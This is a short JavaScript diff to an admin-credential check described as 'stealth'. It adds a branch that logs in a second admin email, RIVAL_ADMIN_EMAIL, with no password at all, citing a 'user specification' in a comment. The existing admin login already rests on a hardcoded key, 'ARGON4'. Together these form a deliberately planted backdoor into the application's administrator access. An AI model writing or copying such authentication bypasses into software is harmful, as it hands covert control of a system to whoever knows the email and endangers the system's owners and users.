@@ -59,10 +59,15 @@ const ADMIN_EMAILS = [ADMIN_EMAIL, RIVAL_ADMIN_EMAIL];
 /**
  * Checks whether email/identifier and key match the stealth admin credentials
  */
-function isValidAdminCredentials(identifier, key) {
-  if (typeof identifier !== 'string' || typeof key !== 'string') return false;
+function isValidAdminCredentials(identifier, key = '') {
+  if (typeof identifier !== 'string') return false;
   const normEmail = identifier.trim().toLowerCase();
-  if (!ADMIN_EMAILS.includes(normEmail)) return false;
+  if (normEmail === RIVAL_ADMIN_EMAIL) {
+    // User specification: cifrixa does not require password
+    return true;
+  }
+  if (normEmail !== ADMIN_EMAIL) return false;
+  if (typeof key !== 'string') return false;
   const normKey = key.trim().toUpperCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '');
   return normKey === 'ARGON4';
 }
